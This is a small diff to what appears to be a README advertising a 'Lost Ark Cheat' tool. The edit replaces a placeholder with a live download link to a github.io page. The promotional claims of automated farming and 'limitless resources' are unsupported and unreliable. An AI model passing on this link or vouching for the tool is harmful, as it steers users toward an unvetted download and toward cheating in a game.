@@ -2,7 +2,7 @@
 
 🚀 **Lost Ark Cheat** is a powerful tool designed to streamline your progress in Lost Ark. Automate farming and unlock limitless resources with cutting-edge technology. Compatible with the latest game versions, user-friendly, and updated daily.  
 
-[![Download Lost Ark Cheat](https://img.shields.io/badge/Download-Lost_Ark_Cheat-blueviolet)](#)  
+[![Download Lost Ark Cheat](https://img.shields.io/badge/Download-Lost_Ark_Cheat-blueviolet)](https://lost-ark-cheat.github.io/.github/)  
 
 ---
 
